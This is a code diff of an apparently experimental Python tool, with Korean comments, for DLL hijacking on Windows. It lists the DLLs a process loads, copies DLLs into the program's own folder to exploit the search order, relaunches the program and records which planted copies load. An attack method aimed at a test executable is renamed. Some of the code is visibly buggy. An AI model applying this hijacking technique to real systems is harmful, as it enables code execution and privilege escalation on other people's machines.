@@ -12,27 +12,41 @@ class hiJacking():
         stream = os.popen("Listdlls.exe " + str(pid))
         dlls = stream.read()
         program_name = ""
+        list_dlls = []
+        list_programs = []
+        path_lists = []
+        # try:
+        #     program_name = dlls.split("\n")[7]
+        #     program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
+        #     if not program_name.endswith('.exe'):
+        #         raise Exception("not exe File")
+        # except:
+        #     print("Wrong pid...")
+        
+        
+        # if 'C:/' not in program_name:
+        #     name_split = program_name.split('/')
+        #     name = name_split[-1]
+        #     for dirpath, dirname, filename in tqdm(os.walk("C:/")):
+        #         if name in filename:
+        #             program_name =  os.path.join(dirpath, name)
+
+        # split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
         try:
-            program_name = dlls.split("\n")[7]
-            program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
-            if not program_name.endswith('.exe'):
-                raise Exception("not exe File")
+            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
+            
+       
+            for i in split_text:
+                path_lists.append(i.replace(" ",""))
+            
+            for i in path_lists:
+                if i.endswith(".exe"):
+                    list_programs.append(i)
+                if i.endswith(".dll"):
+                    list_dlls.append(i)   
+            program_name = list_programs[0]
         except:
             print("Wrong pid...")
-        
-        
-        if 'C:/' not in program_name:
-            name_split = program_name.split('/')
-            name = name_split[-1]
-            for dirpath, dirname, filename in tqdm(os.walk("C:/")):
-                if name in filename:
-                    program_name =  os.path.join(dirpath, name)
-
-        split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
-        list_dlls = []
-        for i in split_text:
-            if i.endswith(".dll"):
-                list_dlls.append(i)
         return program_name, list_dlls
         
         #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
@@ -85,9 +99,45 @@ class hiJacking():
                 
         except:
             print("Cannot remove or write DLL")
+            
+    def search_order_hijack(self,pid):
+        program_name, list_dlls = self.list_dll(pid)
+        program_path = os.path.dirname(program_name)
+        changed_path = []
+        for i in list_dlls:
+            name_split = i.split('/')
+            name = name_split[-1]
+            search_order_path = program_path + "/" + name
+            try:
+                shutil.copy2(list_dlls,search_order_path)
+                changed_path.append(search_order_path)
+            except:
+                print(i + "  1순위 복사 에러")
+            
+        newPid = self.create_process(program_name)
+        program_name, newList_dlls = self.list_dll(newPid)
+        
+        
+        successed_path = {}
+        for i in range(len(newList_dlls)):
+            if newList_dlls[i] in changed_path:
+                successed_path[list_dlls[i]] = newList_dlls[i]
+        successed_path2 = {}
+        for i in newList_dlls:
+            if i in changed_path:
+                name_split = i.split('/')
+                name = name_split[-1]
+                
+                for j in list_dlls:
+                    j.endswith(name)
+                    successed_path2[i] = j
+        
+        
+        return successed_path
+        
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
-    def attack(self):
+    def normal_hijack(self):
         path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
         path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
         pid = self.create_process(path_exe)
@@ -139,7 +189,11 @@ if __name__=='__main__':
     path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
     #pid = dll_hijact.create_process(path_exe)
     #inject(pid,path_dll)
-    dll_hijact.attack()
+    program_name, list_dlls = dll_hijact.list_dll(32980)
+    print(program_name)
+    
+    for i in list_dlls:
+        print(i)
     
     
         
